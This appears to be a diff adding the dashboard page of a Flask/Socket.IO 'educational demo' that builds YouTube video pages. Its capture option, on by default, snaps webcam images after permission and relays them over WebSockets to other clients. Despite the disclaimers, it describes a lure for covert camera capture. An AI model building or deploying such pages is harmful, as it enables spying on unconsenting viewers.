@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Educativa - Visor de YouTube</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3a0ca3;
+            --accent-color: #f72585;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+        }
+        
+        body {
+            background-color: var(--light-color);
+            padding-top: 70px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .main-container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+        }
+        
+        .navbar {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            box-shadow: 0 3px 15px rgba(0,0,0,0.2);
+            padding: 12px 0;
+        }
+        
+        .navbar-brand {
+            font-weight: bold;
+            font-size: 1.4rem;
+            letter-spacing: 0.5px;
+        }
+        
+        .nav-link {
+            position: relative;
+            margin: 0 5px;
+            padding: 8px 15px !important;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-link:hover {
+            background-color: rgba(255,255,255,0.15);
+            transform: translateY(-2px);
+        }
+        
+        .nav-link.active {
+            background-color: rgba(255,255,255,0.2);
+            font-weight: 500;
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1.2rem;
+            transition: all 0.3s ease;
+        }
+        
+        .card {
+            border: none;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            height: 100%;
+        }
+        
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        
+        .card:hover .feature-icon {
+            transform: scale(1.2);
+            color: var(--accent-color);
+        }
+        
+        .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--secondary-color);
+            border-color: var(--secondary-color);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .form-control, .form-select {
+            border-radius: 8px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            box-shadow: none;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
+        }
+        
+        .tab-content {
+            padding: 25px 0;
+        }
+        
+        h1, h2, h3, h4, h5 {
+            color: var(--dark-color);
+            font-weight: 600;
+        }
+        
+        .list-group-item {
+            padding: 15px;
+            border-radius: 8px !important;
+            margin-bottom: 5px;
+            border: 1px solid #eee;
+            transition: all 0.2s;
+        }
+        
+        .list-group-item:hover {
+            background-color: #f8f9fa;
+        }
+        
+        .list-group-item a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .alert {
+            border-radius: 8px;
+            padding: 15px;
+        }
+        
+        /* Preloader para imágenes */
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #FFF;
+            border-bottom-color: var(--primary-color);
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+        
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .sidebar-menu {
+            position: fixed;
+            top: 80px;
+            left: 20px;
+            width: 60px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px 0;
+            z-index: 1000;
+        }
+        
+        .sidebar-menu a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 45px;
+            height: 45px;
+            margin: 5px 0;
+            border-radius: 10px;
+            color: var(--dark-color);
+            transition: all 0.3s;
+        }
+        
+        .sidebar-menu a:hover {
+            background-color: var(--primary-color);
+            color: white;
+            transform: translateY(-2px);
+        }
+        
+        .sidebar-menu a i {
+            font-size: 1.2rem;
+        }
+        
+        /* Mejoras para móviles */
+        @media (max-width: 768px) {
+            .sidebar-menu {
+                display: none;
+            }
+            
+            .main-container {
+                padding: 20px;
+                margin: 10px;
+                border-radius: 10px;
+            }
+            
+            .card {
+                margin-bottom: 15px;
+            }
+        }
+        
+        .form-floating > label {
+            padding: 12px;
+        }
+        
+        .form-check-input:checked {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+        }
+        
+        .accordion-button:not(.collapsed) {
+            background-color: rgba(67, 97, 238, 0.1);
+            color: var(--primary-color);
+        }
+        
+        .dropdown-menu {
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border: none;
+            padding: 10px;
+        }
+        
+        .dropdown-item {
+            border-radius: 5px;
+            padding: 8px 15px;
+            margin: 2px 0;
+        }
+        
+        .dropdown-item:hover {
+            background-color: rgba(67, 97, 238, 0.1);
+        }
+        
+        /* Tooltip personalizado */
+        [data-bs-toggle="tooltip"] {
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <!-- Preloader -->
+    <div id="preloader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; justify-content: center; align-items: center; z-index: 9999;">
+        <span class="loader"></span>
+    </div>
+
+    <!-- Barra de navegación mejorada -->
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-video-camera me-2"></i>Demo Educativa
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="#" data-bs-toggle="tab" data-bs-target="#home">
+                            <i class="fas fa-home me-2"></i> Inicio
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" data-bs-toggle="tab" data-bs-target="#url-tab">
+                            <i class="fas fa-link me-2"></i> Crear Video
+                        </a>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-cog me-2"></i> Herramientas
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
+                            <li><a class="dropdown-item" href="#" id="historySidebarBtn"><i class="fas fa-history me-2"></i> Historial</a></li>
+                            <li><a class="dropdown-item" href="#" id="testConnectionBtn"><i class="fas fa-plug me-2"></i> Probar conexión</a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#" data-bs-toggle="tab" data-bs-target="#about"><i class="fas fa-info-circle me-2"></i> Acerca de</a></li>
+                        </ul>
+                    </li>
+                </ul>
+                <div class="d-flex align-items-center">
+                    <div class="nav-item dropdown">
+                        <a class="btn btn-outline-light dropdown-toggle" href="#" id="themeDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-palette me-2"></i> Tema
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="themeDropdown">
+                            <li><a class="dropdown-item" href="#" onclick="cambiarTema('default')"><i class="fas fa-circle me-2 text-primary"></i> Azul</a></li>
+                            <li><a class="dropdown-item" href="#" onclick="cambiarTema('dark')"><i class="fas fa-circle me-2 text-dark"></i> Oscuro</a></li>
+                            <li><a class="dropdown-item" href="#" onclick="cambiarTema('green')"><i class="fas fa-circle me-2 text-success"></i> Verde</a></li>
+                            <li><a class="dropdown-item" href="#" onclick="cambiarTema('pink')"><i class="fas fa-circle me-2 text-danger"></i> Rosa</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+    
+    <!-- Menú lateral -->
+    <div class="sidebar-menu d-none d-lg-flex">
+        <a href="#" data-bs-toggle="tooltip" data-bs-placement="right" title="Inicio" data-bs-toggle="tab" data-bs-target="#home">
+            <i class="fas fa-home"></i>
+        </a>
+        <a href="#" data-bs-toggle="tooltip" data-bs-placement="right" title="Crear Video" data-bs-toggle="tab" data-bs-target="#url-tab">
+            <i class="fas fa-video"></i>
+        </a>
+        <a href="#" data-bs-toggle="tooltip" data-bs-placement="right" title="Historial" id="historySidebarLink">
+            <i class="fas fa-history"></i>
+        </a>
+        <a href="#" data-bs-toggle="tooltip" data-bs-placement="right" title="Probar conexión" id="testConnectionLink">
+            <i class="fas fa-wifi"></i>
+        </a>
+        <a href="#" data-bs-toggle="tooltip" data-bs-placement="right" title="Acerca de" data-bs-toggle="tab" data-bs-target="#about">
+            <i class="fas fa-info-circle"></i>
+        </a>
+    </div>
+
+    <div class="container main-container">
+        <div class="tab-content">
+            <!-- Pestaña de inicio -->
+            <div class="tab-pane fade show active" id="home">
+                <h1 class="text-center mb-4"><i class="fas fa-desktop me-2"></i>Demo Educativa de Permisos Web</h1>
+                
+                <div class="alert alert-warning">
+                    <strong><i class="fas fa-exclamation-triangle me-2"></i>NOTA:</strong> Esta es una aplicación educativa que demuestra cómo los sitios web pueden solicitar permisos de cámara. Utilizar este conocimiento para engañar o espiar a otros es ilegal y no ético.
+                </div>
+                
+                <div class="row mt-4">
+                    <div class="col-md-4">
+                        <div class="card text-center h-100">
+                            <div class="card-body">
+                                <div class="feature-icon">
+                                    <i class="fas fa-camera"></i>
+                                </div>
+                                <h5 class="card-title">Permisos Web</h5>
+                                <p class="card-text">Aprende cómo los sitios solicitan acceso a tu cámara y qué permisos son seguros de otorgar.</p>
+                                <a href="#" class="btn btn-sm btn-outline-primary mt-2" data-bs-toggle="tab" data-bs-target="#url-tab">
+                                    <i class="fas fa-arrow-right me-1"></i> Comenzar
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card text-center h-100">
+                            <div class="card-body">
+                                <div class="feature-icon">
+                                    <i class="fas fa-wifi"></i>
+                                </div>
+                                <h5 class="card-title">WebSockets</h5>
+                                <p class="card-text">Comunicación en tiempo real entre navegadores y cómo se utilizan en sitios modernos.</p>
+                                <a href="#" class="btn btn-sm btn-outline-primary mt-2" id="testSocketBtnCard">
+                                    <i class="fas fa-plug me-1"></i> Probar conexión
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card text-center h-100">
+                            <div class="card-body">
+                                <div class="feature-icon">
+                                    <i class="fas fa-shield-alt"></i>
+                                </div>
+                                <h5 class="card-title">Seguridad</h5>
+                                <p class="card-text">Comprende la importancia de verificar permisos y cómo proteger tu privacidad en línea.</p>
+                                <a href="#" class="btn btn-sm btn-outline-primary mt-2" data-bs-toggle="tab" data-bs-target="#about">
+                                    <i class="fas fa-info-circle me-1"></i> Más información
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="text-center mt-5">
+                    <button class="btn btn-lg btn-primary" data-bs-toggle="tab" data-bs-target="#url-tab">
+                        <i class="fas fa-play me-2"></i>Comenzar ahora
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Pestaña para ingresar URL -->
+            <div class="tab-pane fade" id="url-tab">
+                <h2 class="text-center mb-4"><i class="fas fa-link me-2"></i>Crear página con video de YouTube</h2>
+                
+                <form action="/ver" method="GET" onsubmit="return validarURL();" id="youtubeForm">
+                    <div class="form-floating mb-4">
+                        <input type="text" class="form-control" id="url" name="url" 
+                               placeholder="https://www.youtube.com/watch?v=..." required>
+                        <label for="url"><i class="fab fa-youtube me-2"></i>URL del video</label>
+                        <div class="form-text"><i class="fas fa-info-circle me-1"></i> Introduce una URL válida de YouTube (ej: https://www.youtube.com/watch?v=dQw4w9WgXcQ)</div>
+                    </div>
+                    
+                    <div class="accordion mb-4" id="optionsAccordion">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="headingOptions">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOptions">
+                                    <i class="fas fa-cog me-2"></i>Opciones avanzadas
+                                </button>
+                            </h2>
+                            <div id="collapseOptions" class="accordion-collapse collapse" data-bs-parent="#optionsAccordion">
+                                <div class="accordion-body">
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <div class="form-check form-switch mb-3">
+                                                <input class="form-check-input" type="checkbox" id="autoplaySwitch" name="autoplay" value="1" checked>
+                                                <label class="form-check-label" for="autoplaySwitch">
+                                                    <i class="fas fa-play-circle me-2"></i>Reproducción automática
+                                                </label>
+                                                <div class="form-text">El video comenzará a reproducirse automáticamente</div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="form-check form-switch mb-3">
+                                                <input class="form-check-input" type="checkbox" id="captureSwitch" name="autoCapture" value="1" checked>
+                                                <label class="form-check-label" for="captureSwitch">
+                                                    <i class="fas fa-camera me-2"></i>Captura automática
+                                                </label>
+                                                <div class="form-text">Capturar imagen después de dar permisos</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-primary btn-lg">
+                            <i class="fas fa-video me-2"></i>Crear Página de Video
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="alert alert-info mt-4">
+                    <i class="fas fa-info-circle me-2"></i><strong>Consejo:</strong> 
+                    Puedes usar cualquier URL de YouTube válida, incluyendo videos cortos o música.
+                </div>
+                
+                <div id="urlHistory" class="mt-4">
+                    <div class="d-flex align-items-center justify-content-between mb-3">
+                        <h5><i class="fas fa-history me-2"></i>URLs recientes</h5>
+                        <button class="btn btn-sm btn-outline-danger" id="clearHistoryBtn">
+                            <i class="fas fa-trash me-1"></i> Limpiar historial
+                        </button>
+                    </div>
+                    <ul class="list-group" id="historyList">
+                        <!-- El historial se cargará mediante JavaScript -->
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Pestaña Acerca de -->
+            <div class="tab-pane fade" id="about">
+                <h2 class="text-center mb-4"><i class="fas fa-info-circle me-2"></i>Acerca de esta aplicación</h2>
+                
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-graduation-cap me-2"></i>Propósito educativo</h5>
+                        <p class="card-text">Esta aplicación demuestra:</p>
+                        <ol>
+                            <li>Cómo se puede incrustar un video de YouTube en una página web</li>
+                            <li>Cómo solicitar permisos de navegador para acceder a la cámara del usuario</li>
+                            <li>Cómo capturar imágenes desde una transmisión de video</li>
+                            <li>Cómo enviar estas imágenes a través de WebSockets a otros clientes conectados</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-circle me-2"></i><strong>ADVERTENCIA:</strong> 
+                    Esta herramienta es <strong>ÚNICAMENTE para fines educativos</strong>. Su uso para engañar, espiar o capturar imágenes de personas sin su consentimiento explícito e informado es ilegal y no ético.
+                </div>
+                
+                <div class="card">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-code me-2"></i>Aspectos técnicos</h5>
+                        <p class="card-text">Esta aplicación utiliza:</p>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <ul>
+                                    <li><i class="fab fa-python me-2 text-primary"></i> Flask y Flask-SocketIO para el servidor</li>
+                                    <li><i class="fas fa-video me-2 text-danger"></i> WebRTC para acceder a la cámara</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <ul>
+                                    <li><i class="fas fa-wifi me-2 text-success"></i> Socket.IO para comunicación en tiempo real</li>
+                                    <li><i class="fas fa-paint-brush me-2 text-warning"></i> HTML5 Canvas para procesar imágenes</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="mt-4 text-center">
+                    <button class="btn btn-primary" data-bs-toggle="tab" data-bs-target="#url-tab">
+                        <i class="fas fa-arrow-right me-2"></i>Ir a Crear Video
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div id="socketStatus" class="mt-3"></div>
+    </div>
+    
+    <!-- Modal para historial -->
+    <div class="modal fade" id="historyModal" tabindex="-1" aria-labelledby="historyModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="historyModalLabel"><i class="fas fa-history me-2"></i>Historial de URLs</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div id="modalHistoryList"></div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-outline-danger" id="clearHistoryModalBtn">
+                        <i class="fas fa-trash me-1"></i> Limpiar historial
+                    </button>
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cerrar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer class="text-center text-muted py-3 mt-5">
+        <div class="container">
+            <p>Aplicación Educativa de Demostración | <i class="fas fa-code me-1"></i> con <i class="fas fa-heart mx-1 text-danger"></i> por fines educativos</p>
+        </div>
+    </footer>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
+    <script>
+        // Ocultar preloader cuando la página está cargada
+        window.addEventListener('load', function() {
+            const preloader = document.getElementById('preloader');
+            preloader.style.opacity = '0';
+            setTimeout(() => {
+                preloader.style.display = 'none';
+            }, 500);
+        });
+        
+        // Inicializar tooltips
+        document.addEventListener('DOMContentLoaded', function() {
+            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
+            var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+                return new bootstrap.Tooltip(tooltipTriggerEl);
+            });
+        });
+        
+        // Validación de URL de YouTube
+        function validarURL() {
+            const url = document.getElementById('url').value;
+            const regexYoutube = /^(https?:\/\/)?(www\.)?(youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})$/;
+            
+            if (!regexYoutube.test(url)) {
+                alert('Por favor, introduce una URL válida de YouTube');
+                return false;
+            }
+            
+            // Guardar URL en el historial
+            saveToHistory(url);
+            return true;
+        }
+        
+        // Historial de URLs
+        function saveToHistory(url) {
+            let history = JSON.parse(localStorage.getItem('urlHistory') || '[]');
+            // Evitar duplicados
+            if (!history.includes(url)) {
+                // Limitar a 5 elementos
+                history = [url, ...history].slice(0, 5);
+                localStorage.setItem('urlHistory', JSON.stringify(history));
+            }
+        }
+        
+        // Cargar historial
+        function loadHistory() {
+            const historyList = document.getElementById('historyList');
+            const modalHistoryList = document.getElementById('modalHistoryList');
+            const history = JSON.parse(localStorage.getItem('urlHistory') || '[]');
+            
+            historyList.innerHTML = '';
+            modalHistoryList.innerHTML = '';
+            
+            if (history.length === 0) {
+                const noHistory = '<li class="list-group-item text-muted"><i class="fas fa-info-circle me-2"></i>No hay historial reciente</li>';
+                historyList.innerHTML = noHistory;
+                modalHistoryList.innerHTML = noHistory;
+                return;
+            }
+            
+            history.forEach(url => {
+                // Para la pestaña de URL
+                const item = document.createElement('li');
+                item.className = 'list-group-item d-flex justify-content-between align-items-center';
+                
+                const link = document.createElement('a');
+                link.href = `/ver?url=${encodeURIComponent(url)}`;
+                link.innerHTML = `<i class="fab fa-youtube me-2 text-danger"></i>${url}`;
+                item.appendChild(link);
+                
+                const buttonGroup = document.createElement('div');
+                buttonGroup.className = 'btn-group';
+                
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'btn btn-sm btn-outline-primary me-2';
+                copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
+                copyBtn.title = 'Copiar URL';
+                copyBtn.onclick = function(e) {
+                    e.preventDefault();
+                    navigator.clipboard.writeText(url).then(() => {
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i>';
+                        setTimeout(() => copyBtn.innerHTML = '<i class="fas fa-copy"></i>', 1000);
+                    });
+                };
+                
+                const deleteBtn = document.createElement('button');
+                deleteBtn.className = 'btn btn-sm btn-outline-danger';
+                deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
+                deleteBtn.title = 'Eliminar del historial';
+                deleteBtn.onclick = function(e) {
+                    e.preventDefault();
+                    removeFromHistory(url);
+                };
+                
+                buttonGroup.appendChild(copyBtn);
+                buttonGroup.appendChild(deleteBtn);
+                item.appendChild(buttonGroup);
+                
+                historyList.appendChild(item);
+                
+                // Para el modal
+                const modalItem = item.cloneNode(true);
+                modalItem.querySelector('button:last-child').onclick = function(e) {
+                    e.preventDefault();
+                    removeFromHistory(url);
+                };
+                modalHistoryList.appendChild(modalItem);
+            });
+        }
+        
+        // Eliminar del historial
+        function removeFromHistory(url) {
+            let history = JSON.parse(localStorage.getItem('urlHistory') || '[]');
+            history = history.filter(item => item !== url);
+            localStorage.setItem('urlHistory', JSON.stringify(history));
+            loadHistory();
+        }
+        
+        // Limpiar todo el historial
+        function clearHistory() {
+            if (confirm('¿Estás seguro de que quieres borrar todo el historial?')) {
+                localStorage.removeItem('urlHistory');
+                loadHistory();
+            }
+        }
+        
+        // Probar conexión Socket.IO
+        function testSocketConnection() {
+            const statusDiv = document.getElementById('socketStatus');
+            statusDiv.innerHTML = '<div class="alert alert-info"><i class="fas fa-spinner fa-spin me-2"></i>Probando conexión...</div>';
+            
+            try {
+                const socket = io(window.location.origin);
+                
+                socket.on('connect', function() {
+                    statusDiv.innerHTML = '<div class="alert alert-success"><i class="fas fa-check-circle me-2"></i>¡Conexión exitosa! El servidor está respondiendo correctamente.</div>';
+                    socket.emit('test_connection', {client: 'web', timestamp: new Date().toISOString()});
+                });
+                
+                socket.on('connection_response', function(data) {
+                    const additionalInfo = `<div class="mt-2 small"><i class="fas fa-info-circle me-1"></i>ID de sesión: ${socket.id}</div>`;
+                    statusDiv.innerHTML = statusDiv.innerHTML.replace('</div>', additionalInfo + '</div>');
+                });
+                
+                socket.on('connect_error', function(err) {
+                    statusDiv.innerHTML = `<div class="alert alert-danger"><i class="fas fa-times-circle me-2"></i>Error de conexión: ${err.message}</div>`;
+                });
+                
+                // Timeout para mostrar error si no hay respuesta
+                setTimeout(() => {
+                    if (socket.connected) {
+                        // Ya conectado, no hacer nada
+                    } else {
+                        statusDiv.innerHTML = '<div class="alert alert-warning"><i class="fas fa-exclamation-triangle me-2"></i>Tiempo de espera agotado. El servidor no está respondiendo.</div>';
+                    }
+                }, 5000);
+                
+            } catch(e) {
+                statusDiv.innerHTML = `<div class="alert alert-danger"><i class="fas fa-times-circle me-2"></i>Error al inicializar Socket.IO: ${e.message}</div>`;
+            }
+        }
+        
+        // Sugerir URL de YouTube
+        function sugerirURL() {
+            const ejemplos = [
+                'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                'https://www.youtube.com/watch?v=FvG0SNgfYMQ',
+                'https://youtu.be/gp5sGpH9VTo',
+                'https://www.youtube.com/watch?v=sHIk-piFUgw'
+            ];
+            
+            const url = document.getElementById('url');
+            url.value = ejemplos[Math.floor(Math.random() * ejemplos.length)];
+        }
+        
+        // Cambiar tema
+        function cambiarTema(tema) {
+            const root = document.documentElement;
+            
+            switch(tema) {
+                case 'dark':
+                    root.style.setProperty('--primary-color', '#7209b7');
+                    root.style.setProperty('--secondary-color', '#560bad');
+                    root.style.setProperty('--accent-color', '#f72585');
+                    root.style.setProperty('--light-color', '#212529');
+                    root.style.setProperty('--dark-color', '#f8f9fa');
+                    document.body.style.backgroundColor = '#212529';
+                    document.body.style.color = '#f8f9fa';
+                    break;
+                case 'green':
+                    root.style.setProperty('--primary-color', '#38b000');
+                    root.style.setProperty('--secondary-color', '#008000');
+                    root.style.setProperty('--accent-color', '#70e000');
+                    root.style.setProperty('--light-color', '#f8f9fa');
+                    root.style.setProperty('--dark-color', '#212529');
+                    document.body.style.backgroundColor = '#f8f9fa';
+                    document.body.style.color = '#212529';
+                    break;
+                case 'pink':
+                    root.style.setProperty('--primary-color', '#ff0a54');
+                    root.style.setProperty('--secondary-color', '#ff477e');
+                    root.style.setProperty('--accent-color', '#ff7096');
+                    root.style.setProperty('--light-color', '#f8f9fa');
+                    root.style.setProperty('--dark-color', '#212529');
+                    document.body.style.backgroundColor = '#f8f9fa';
+                    document.body.style.color = '#212529';
+                    break;
+                default: // default/blue
+                    root.style.setProperty('--primary-color', '#4361ee');
+                    root.style.setProperty('--secondary-color', '#3a0ca3');
+                    root.style.setProperty('--accent-color', '#f72585');
+                    root.style.setProperty('--light-color', '#f8f9fa');
+                    root.style.setProperty('--dark-color', '#212529');
+                    document.body.style.backgroundColor = '#f8f9fa';
+                    document.body.style.color = '#212529';
+            }
+            
+            // Guardar preferencia
+            localStorage.setItem('theme', tema);
+        }
+        
+        // Event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            // Cargar historial
+            loadHistory();
+            
+            // Cargar tema guardado
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme) {
+                cambiarTema(savedTheme);
+            }
+            
+            // Botón de prueba de conexión en tarjeta
+            document.getElementById('testSocketBtnCard').addEventListener('click', function(e) {
+                e.preventDefault();
+                testSocketConnection();
+                // Desplazar a la sección de estado
+                document.getElementById('socketStatus').scrollIntoView({behavior: 'smooth'});
+            });
+        });
+    </script>
+</body>
+</html> 
